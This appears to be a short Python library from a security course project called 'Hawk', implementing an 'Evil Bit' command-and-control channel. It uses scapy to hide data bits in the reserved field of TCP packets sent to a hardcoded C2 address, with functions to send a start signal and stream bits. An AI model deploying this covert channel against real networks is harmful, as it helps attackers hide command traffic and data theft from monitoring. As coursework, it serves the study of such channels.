# Hawk
# Author: Jason Howe
# CSEC 750
# Evil Bit C2

# lib.py
# common library functions for Hawk

from scapy.all import *

C2_IP = "192.168.1.1"

class Payload(Packet):
    name = "Payload"
    fields_desc = [
        BitField("data", 0, 3)
    ]


def build_packet(pl: Payload):
    ip_layer = IP(dst=C2_IP)

    tcp_layer = TCP(
        reserved=pl
    )

    return ip_layer/tcp_layer


def send_start():
    payload = Payload(data=101)
    start_packet = build_packet(payload)
    send(start_packet)

def send_bits(bits):
    payload = Payload(data=bits)
    packet = build_packet(payload)
    send(packet)